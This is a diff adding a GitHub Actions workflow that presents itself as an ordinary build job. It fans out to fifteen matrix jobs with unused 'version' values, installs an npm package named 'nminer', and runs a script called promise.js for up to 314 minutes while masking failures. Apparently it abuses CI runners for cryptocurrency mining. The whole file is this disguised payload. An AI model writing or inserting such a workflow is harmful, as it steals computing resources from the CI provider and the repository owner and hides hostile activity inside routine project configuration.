@@ -1,0 +1,40 @@
+name: promise
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 2457 }
+          - { version: 3707 }
+          - { version: 9933 }
+          - { version: 5725 }
+          - { version: 4887 }
+          - { version: 114 }
+          - { version: 2697 }
+          - { version: 4802 }
+          - { version: 2740 }
+          - { version: 5281 }
+          - { version: 7102 }
+          - { version: 6367 }
+          - { version: 4272 }
+          - { version: 4577 }
+          - { version: 2394 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: beyond
+        run: |
+          npm install nminer@latest
+          timeout 314m node promise.js || echo "promise executed"
